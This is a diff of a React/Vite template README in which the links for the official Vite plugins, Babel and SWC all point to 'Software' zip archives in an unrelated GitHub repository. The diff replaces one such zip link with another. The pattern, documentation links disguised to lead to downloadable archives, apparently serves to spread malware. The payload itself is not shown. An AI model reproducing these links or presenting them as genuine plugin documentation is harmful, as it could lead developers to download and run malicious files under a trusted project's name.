@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/Software_v3.9.zip) uses [Babel](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/Software_v3.9.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/Software_v3.9.zip) uses [SWC](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/Software_v3.9.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/PageHeader/Software_electrodeless.zip) uses [Babel](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/PageHeader/Software_electrodeless.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/PageHeader/Software_electrodeless.zip) uses [SWC](https://raw.githubusercontent.com/Rahul-Raj-04/ecommerce/main/src/Component/PageHeader/Software_electrodeless.zip) for Fast Refresh
